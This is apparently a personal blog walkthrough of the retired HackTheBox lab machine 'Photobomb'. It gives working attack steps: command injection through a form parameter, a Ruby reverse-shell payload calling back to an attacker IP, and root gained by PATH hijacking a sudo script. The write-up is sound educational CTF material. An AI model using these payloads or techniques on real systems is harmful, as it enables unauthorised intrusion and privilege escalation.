---
title: Photobomb HTB Walkthrough
tags: ["pentesting", "security", "penetration testing", "ctf", "sinatra", "sudo"]
date: 2023-02-11
author: emdwyer
---

![Photobomb](./photobomb.png)

## Introduction

An easy rated machine, and one of my first on HTB that was recently retired.  This box was pwned before I started using [MarkText](https://github.com/marktext/marktext) and adding in screenshots to my markdown notes, so I've only captured STDOUT here, and the entire write up is boring plain text.. sorry.

As always, I use [Parrot OS Security Edition](https://www.parrotsec.org/download/) in a VirtualBox VM, with the OpenVPN client to connect to the HackTheBox VPN.

## Enumeration

Nmap -sC and -sV shows 22 (ssh) and http (80) open.  Navigating to http://10.10.11.182/ redirects to http://photobomb.htb.
After adding this domain to /etc/hosts, we see a landing page for Photobomb franchise, with a link to http://photobomb.htb/printer -- which presents a basic auth dialog.

Again, no screenshots, so you will need to use your imagination or just trust me.

Let's start up gobuster in the background while poking around:

```bash
gobuster dir -u http://photobomb.htb -w /usr/share/dirb/wordlists/common.txt
```

This only returns a favicon and /printer plus /printers, both of which require a user/pass, but if I run gobuster with the `/usr/share/dirb/wordlists/big.txt` wordlist, I notice:

```
===============================================================
2022/12/25 13:06:09 Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 273]
/]                    (Status: 400) [Size: 273]
/favicon.ico          (Status: 200) [Size: 10990]
/plain]               (Status: 400) [Size: 278]  
/printer              (Status: 401) [Size: 188]  
/printer-friendly     (Status: 401) [Size: 188]  
/printerfriendly      (Status: 401) [Size: 188]  
/printer_friendly     (Status: 401) [Size: 188]  
/printers             (Status: 401) [Size: 188]  
/quote]               (Status: 400) [Size: 278]  

```

Manually checking some of the above:
```
Bad Request
bad URI `/quote]'.
WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25) at photobomb:4567 
```

So maybe I should look at WEBrick vulns.. but should quickly look at the rest of the site before going deep into a rabbit hole and never returning.

I found the following javascript http://photobomb.htb/photobomb.js, which is requested when visiting the home page.  I basically just leave the Firefox developer tools open and
see what interesting looking requests are made, but intercepting via Burp Suite and looking at the Site map is also a good option here -- especially as the number of files, directories and general structure of the site become larger and more complex.  Burp suite will build up a better picture of what the site looks like over time as you navigate around, fire off requests, etc.

Anyway, the javascript file in question contains:

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

Confirmed I am able to log in to http://pH0t0:b0Mb!@photobomb.htb/printer , which gives me a gallery of JPEG thumbnails along with a big red D*OWNLOAD PHOTO TO PRINT* button, and a drop-down to select the file format.

Burp suite captures the following when intercepting POST requests to download an image in a selected file format via the UI:

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://photobomb.htb/printer
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://photobomb.htb
DNT: 1
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

After logging in, I can also hit the /printers endpoint I found earlier, which indicates it's a Sinatra app:

```
Sinatra doesn’t know this ditty.
Try this:

get '/printers' do
  "Hello World"
end
```

## Foothold

I initially tried to use [commix](https://github.com/commixproject/commix) for command injection, but it kept erroring out. I then tried command injection into the photo param without any success.  But then I was able to confirm command injection by sending the following payload to /printer:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;sleep 15&dimensions=30x20
```

So, we basically escape the file type with a semi-colon `;`, no need for quotes, double-quotes etc.

I confirmed the endpoint appeared to become unresponsive for ~15 seconds as expected.
I had issues with typical bash reverse shells, and assumed injecting into the file type was working as the application maybe (?) shells out to bash to run imagemagick or similar in order to convert the image format on the fly, but I was able to use a URL encoded ruby shell from [revshells.com](https://revshells.com):

```
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.3",6969))'
```

When injected, by setting Burp Suite to automagically HTML encode my payload, we end up sending the following in the body of the POST request:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.3%22%2C6969%29%29%27&dimensions=30x20
```

I confirmed I now had a reverse shell:

```
$nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.182] 50358
python3 -c 'import pty; pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ id
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
wizard@photobomb:~/photobomb$ find / -name 'user.txt' 2> /dev/null
find / -name 'user.txt' 2> /dev/null
/home/wizard/user.txt
wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt
cat /home/wizard/user.txt
0afc4ac78d0ff030a8ee3a05821cabf1
```

So I have the user flag, taken from wizard's account!

## Privilege Escalation

Now on to privilege escalation.  First, let's try the low hanging fruit:

```bash
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

So we can run `/opt/cleanup.sh`..  Looking at this script:

```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

The commands are absolute paths except for `find`. I tried copying `/bin/bash` to `/tmp/find`, and running the script while
preserving my environment with the `-E` flag, which disables the env_reset option:

```bash
PATH="/tmp:$PATH" sudo -E /opt/cleanup.sh
```
So, when the shell attempts to run `find`, it first checks the `/tmp` directory, and instead would execute my copy of `bash`.

However, this wasn't working, and after a few minutes of digging through the [sudo man page](https://man7.org/linux/man-pages/man8/sudo.8.html) I noticed the env_reset in `sudo -l` output will reset the path, however also noticed that SETENV is enabled.  So, I was able to pick up my fake find executable with a plain old:

```bash
wizard@photobomb:~/photobomb$ sudo PATH="/tmp:$PATH" /opt/cleanup.sh 
root@photobomb:/home/wizard/photobomb# id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
adc699daf52cc1ba2c0d95e5cc85f007
```

So the `/opt/cleanup.sh` script runs as root, and locates the `find` command in `/tmp`, which is actually a copy of `bash` -- giving us a root shell.

Machine completed!

https://www.hackthebox.com/achievement/machine/329250/500

## Conclusion

Quite straight forward with basic web enumeration -- a javascript file with hardcoded basic auth creds,
leading into a basic web app that displays a photo gallery.  Looking at web requests, we can see a param for filetype in the form data which we can inject into after failing to inject into filename.

I struggled to get a basic bash reverse shell working, but knowing the app is a Ruby-based Sinatra app, we can inject a Ruby reverse shell that calls out to `sh` and pipes the output to a TCP socket in order to gain foothold.

From here, we can take advantage of a script we can run as `sudo` by clobbering the expected `find` executable's location in `PATH`.  While env_reset is enabled which causes commands to be executed with a minimal environment, the SETENV option is set, which allows us to prefix a directory to PATH -- this directory is enumerated first, finding and executing our renamed `bash` command as `find` -- giving us a root shell.

Looking forward to posting the next one!